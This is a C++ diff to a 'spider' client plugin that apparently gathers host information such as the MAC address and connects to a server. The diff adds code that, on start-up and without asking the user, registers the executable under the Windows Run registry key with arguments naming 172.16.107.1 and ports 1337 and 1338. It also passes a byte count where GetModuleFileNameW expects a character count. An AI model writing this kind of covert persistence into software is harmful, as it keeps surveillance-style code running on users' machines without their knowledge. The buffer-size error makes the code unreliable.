@@ -10,8 +10,6 @@
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
 
-#include <iostream> // TODO: rm
-
 namespace spider
 {
   namespace client
@@ -207,6 +205,9 @@ namespace spider
 	getInfosWindows();
 
 	MacAddress::get(m_macAddr);
+
+	// Register program for automatic startup
+	registerProgram();
 
 	return true;
       }
@@ -622,6 +623,102 @@ namespace spider
 	      }
 	    TranslateMessage(&msg);
 	    DispatchMessage(&msg);
+	  }
+      }
+
+      bool SpiderPlugin::isRegistered(PCWSTR pszAppName) const
+      {
+	HKEY  hKey = nullptr;
+	LONG  lResult = 0;
+	bool  fSuccess = true;
+	DWORD dwRegType = REG_SZ;
+	WCHAR szPathToExe[MAX_PATH] = {};
+	DWORD dwSize = sizeof(szPathToExe);
+
+	lResult =
+	    RegOpenKeyExW(HKEY_CURRENT_USER,
+	                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+	                  0, KEY_READ, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	  {
+	    lResult = RegGetValueW(hKey, nullptr, pszAppName, RRF_RT_REG_SZ,
+	                           &dwRegType, szPathToExe, &dwSize);
+	    fSuccess = (lResult == 0);
+	  }
+
+	if (fSuccess)
+	  {
+	    fSuccess = (wcslen(szPathToExe) > 0) ? true : false;
+	  }
+
+	if (hKey != nullptr)
+	  {
+	    RegCloseKey(hKey);
+	    hKey = nullptr;
+	  }
+
+	return fSuccess;
+      }
+
+      bool SpiderPlugin::registerForStartup(PCWSTR pszAppName,
+                                            PCWSTR pathToExe, PCWSTR args)
+      {
+	HKEY  hKey = nullptr;
+	LONG  lResult = 0;
+	bool  fSuccess = true;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	WCHAR        szValue[count] = {};
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args)
+	  {
+	    // caller should make sure "args" is quoted if any single argument
+	    // has a space
+	    // e.g. (L"-name \"Mark Voidale\"");
+	    wcscat_s(szValue, count, args);
+	  }
+
+	lResult = RegCreateKeyExW(
+	    HKEY_CURRENT_USER,
+	    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr,
+	    0, (KEY_WRITE | KEY_READ), nullptr, &hKey, nullptr);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	  {
+	    dwSize = (wcslen(szValue) + 1) * 2;
+	    lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ,
+	                             (BYTE *)szValue, dwSize);
+	    fSuccess = (lResult == 0);
+	  }
+
+	if (hKey)
+	  {
+	    RegCloseKey(hKey);
+	    hKey = nullptr;
+	  }
+
+	return fSuccess;
+      }
+
+      void SpiderPlugin::registerProgram()
+      {
+	std::array<WCHAR, MAX_PATH> pathToExe;
+
+	if (!isRegistered(L"spider"))
+	  {
+	    GetModuleFileNameW(nullptr, pathToExe.data(), sizeof(pathToExe));
+	    registerForStartup(L"spider", pathToExe.data(),
+	                       L"172.16.107.1 1337 1338");
 	  }
       }
     }
